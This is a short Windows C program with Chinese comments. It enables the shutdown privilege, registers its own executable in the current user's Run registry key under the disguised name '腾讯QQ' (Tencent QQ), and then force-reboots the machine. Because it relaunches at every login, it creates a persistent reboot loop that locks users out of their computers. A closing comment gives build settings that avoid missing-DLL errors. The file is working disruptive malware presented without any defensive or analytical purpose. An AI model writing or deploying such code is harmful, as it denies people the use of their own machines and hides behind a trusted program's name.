#include <stdio.h>
#include <Windows.h>

int main() {

	// 启动项在注册表中的位置：HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

	// 提权
	HANDLE hToken;
	if (0 == OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
		printf("提升权限失败 code:001\n");
		return 0;
	}

	// 查看一下权限
	LUID luid;
	if (0 == LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &luid)) {
		printf("查看权限失败 code:002\n");
		return 0;
	}

	// 修改权限
	TOKEN_PRIVILEGES tkp;
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (0 == AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
		printf("提升权限失败 code:003\n");
		return 0;
	}

	// 注册表句柄
	HKEY hKey;

	// 打开注册表
	if (0 != RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey)) {
		printf("打开注册表失败！code:004");
		return 0;
	}

	// 获取自己的路径
	TCHAR szData[260];
	GetModuleFileName(NULL, szData, 260);

	// 写注册表
	
	RegSetValueEx(hKey, L"腾讯QQ", 0, REG_SZ, (BYTE*)szData, 260);

	// 关闭注册表
	RegCloseKey(hKey);

	// 重启
	// system("shutdown -r");

	// 关机 重启
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);

	return 0;

	/*
	缺少dll的解决方法：
	1. 选择release
	2. 项目-》属性， 配置属性-》c/c++ -》代码生成-》运行库-》多线程
	3. 重新生成
	*/
}